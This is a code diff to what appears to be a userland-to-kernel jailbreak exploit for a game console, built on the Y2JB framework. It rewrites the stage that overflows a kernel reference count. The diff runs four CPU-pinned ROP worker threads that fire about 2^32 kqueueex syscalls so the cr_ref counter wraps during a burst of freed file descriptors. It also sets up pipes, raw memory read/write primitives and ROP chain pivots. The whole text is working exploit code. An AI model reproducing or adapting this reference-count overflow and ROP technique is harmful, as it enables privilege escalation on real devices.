@@ -9,6 +9,7 @@
  *   - Y2JB userland framework: Gezine (https://github.com/Gezine/Y2JB)
  *   - elfldr_1320 ELF loader binary: Gezine
  *   - notmaj0r remote_lua_loader p2jb port (secondary reference)
+ *   - Edigax: multi-core leak implementation (~48 min vs ~2h)
  *
  * Usage: see README.md.
  */
@@ -763,54 +764,73 @@
 
             const TOTAL_SYSCALLS = 0x100000001n - BigInt(free_fds_num);
 
+            // Multi-core leak: 4 pinned ROP workers (cores 0,1,2,3). Per-worker
+            // kqueueex counts sum to EXACTLY TOTAL_SYSCALLS, so the cr_ref wrap
+            // still lands in the free-fd burst. ~48 min vs ~2h single-core.
             const POC_ARG = 0x800000000000n;
             const EXIT_MARK = 0xDEADn;
             const LEAK_UNROLL = 4096;
             const U = BigInt(LEAK_UNROLL);
-            const BPLUS1 = TOTAL_SYSCALLS / U;
-            const NORMAL_BATCHES = BPLUS1 - 1n;
-            const WORKER_CALLS = BPLUS1 * U;
-            const REMAINDER = TOTAL_SYSCALLS - WORKER_CALLS;
+            const LEAK_CORES = [0, 1, 2, 3];
+            const NW = LEAK_CORES.length;
+            const FEED_CHUNK = 4096;
 
             my_init_threading();
-            const [lk_r, lk_w] = create_pipe();
-            const lk_rfd = Number(lk_r), lk_wfd = Number(lk_w);
-
-            syscall(SYSCALL.fcntl, BigInt(lk_wfd), F_SETFL, O_NONBLOCK);
-
-            const finished = malloc(8); write64(finished, 0n);
-            const dummybuf = malloc(8);
-            const FEED_CHUNK = 4096;
             const chunkbuf = malloc(FEED_CHUNK);
-            const lw = build_leak_worker_chain(2, lk_rfd, finished, dummybuf,
-                LEAK_UNROLL, Number(REMAINDER));
-            spawn_leak_worker(lw.entry);
 
-            let queued = 0n;
-            while (queued < NORMAL_BATCHES) {
-                let want = NORMAL_BATCHES - queued;
-                if (want > BigInt(FEED_CHUNK)) want = BigInt(FEED_CHUNK);
-                const n = syscall(SYSCALL.write, BigInt(lk_wfd), chunkbuf, want);
-                if (n > 0n && n <= BigInt(FEED_CHUNK)) queued += n;
+            const base_share = TOTAL_SYSCALLS / BigInt(NW);
+            const extra0 = TOTAL_SYSCALLS - base_share * BigInt(NW);
+            const lws = [];
+            for (let w = 0; w < NW; w++) {
+                const target_w = base_share + (w === 0 ? extra0 : 0n);
+                const bplus1_w = target_w / U;
+                const normal_w = bplus1_w - 1n;
+                const remainder_w = target_w - bplus1_w * U;
+                const [pr, pw] = create_pipe();
+                const rfd = Number(pr), wfd = Number(pw);
+                syscall(SYSCALL.fcntl, BigInt(wfd), F_SETFL, O_NONBLOCK);
+                const finished = malloc(8); write64(finished, 0n);
+                const dummybuf = malloc(8);
+                const chain = build_leak_worker_chain(LEAK_CORES[w], rfd,
+                    finished, dummybuf, LEAK_UNROLL, Number(remainder_w));
+                spawn_leak_worker(chain.entry);
+                lws.push({ chain, rfd, wfd, finished, normal: normal_w, queued: 0n });
+            }
+
+            let all_fed = false;
+            while (!all_fed) {
+                all_fed = true;
+                for (const lw of lws) {
+                    if (lw.queued < lw.normal) {
+                        all_fed = false;
+                        let want = lw.normal - lw.queued;
+                        if (want > BigInt(FEED_CHUNK)) want = BigInt(FEED_CHUNK);
+                        const n = syscall(SYSCALL.write, BigInt(lw.wfd), chunkbuf, want);
+                        if (n > 0n && n <= BigInt(FEED_CHUNK)) lw.queued += n;
+                    }
+                }
                 await js_sleep(500);
             }
 
-            while (true) {
-                write64(finished, 0n);
-                await js_sleep(1500);
-                if (read64(finished) === 0n) break;
+            for (const lw of lws) {
+                while (true) {
+                    write64(lw.finished, 0n);
+                    await js_sleep(1500);
+                    if (read64(lw.finished) === 0n) break;
+                }
             }
-
-            write64(lw.pivotAddr, lw.exitAddr);
-            write64(finished, 0n);
-            syscall(SYSCALL.write, BigInt(lk_wfd), chunkbuf, 1n);
-            {
+            for (const lw of lws) {
+                write64(lw.chain.pivotAddr, lw.chain.exitAddr);
+                write64(lw.finished, 0n);
+                syscall(SYSCALL.write, BigInt(lw.wfd), chunkbuf, 1n);
+            }
+            for (const lw of lws) {
                 const dl = Date.now() + 15000;
-                while (read64(finished) !== EXIT_MARK && Date.now() < dl)
+                while (read64(lw.finished) !== EXIT_MARK && Date.now() < dl)
                     await js_sleep(50);
+                syscall(SYSCALL.close, BigInt(lw.rfd));
+                syscall(SYSCALL.close, BigInt(lw.wfd));
             }
-            syscall(SYSCALL.close, BigInt(lk_rfd));
-            syscall(SYSCALL.close, BigInt(lk_wfd));
 
             for (let i = 0; i < free_fds_num; i++) {
                 const fd = new_free_fd();
